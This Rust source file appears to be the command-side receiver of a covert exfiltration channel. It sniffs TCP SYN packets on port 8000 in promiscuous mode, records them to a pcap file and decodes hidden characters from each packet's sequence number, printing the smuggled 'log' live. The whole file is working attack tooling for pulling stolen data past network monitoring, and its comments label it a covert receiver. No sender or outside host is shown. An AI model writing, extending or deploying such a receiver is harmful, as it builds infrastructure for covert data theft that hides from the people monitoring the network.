use chrono::Local;
use pcap::{Capture, Device};
use std::sync::{atomic::{AtomicBool, Ordering}, Arc};
use std::thread;

pub struct PcapHandle {
    running: Arc<AtomicBool>,
}

impl PcapHandle {
    pub fn start(interface: &str) -> Self {
        let running = Arc::new(AtomicBool::new(true));
        let flag = running.clone();
        let iface = interface.to_string();

        thread::spawn(move || {
            let device = Device::list()
                .unwrap()
                .into_iter()
                .find(|d| d.name == iface)
                .expect("Interface not found");

            let ts = Local::now().format("%Y%m%d_%H%M%S");
            let filename = format!("commander_{}.pcap", ts);

            println!("[*] PCAP capture & Covert Receiver started: {}", filename);

            let mut cap = Capture::from_device(device)
                .unwrap()
                .promisc(true)
                .snaplen(65535)
                .timeout(100) // Lower timeout for more frequent flag checks
                .open()
                .unwrap();

            // Set a filter to only look for SYN packets on our covert port (8000)
            let _ = cap.filter("tcp[tcpflags] & tcp-syn != 0 and port 8000", true);

            let mut dump = cap.savefile(&filename).unwrap();

            while flag.load(Ordering::Relaxed) {
                if let Ok(packet) = cap.next_packet() {
                    dump.write(&packet);

                    // --- COVERT EXTRACTION LOGIC ---
                    // TCP header starts at offset 34 (14 Ethernet + 20 IP)
                    // Sequence number is 4 bytes starting at offset 4 of the TCP header
                    if packet.data.len() >= 42 {
                        let seq_bytes = &packet.data[38..42];
                        let seq_num = u32::from_be_bytes([seq_bytes[0], seq_bytes[1], seq_bytes[2], seq_bytes[3]]);
                        
                        // Convert the sequence number (the byte) back to a character
                        if let Some(c) = char::from_u32(seq_num) {
                            print!("{}", c); // Live-print the log as it arrives
                            std::io::Write::flush(&mut std::io::stdout()).unwrap();
                        }
                    }
                }
            }

            println!("\n[*] PCAP capture stopped.");
        });

        Self { running }
    }
}

impl Drop for PcapHandle {
    fn drop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
    }
}
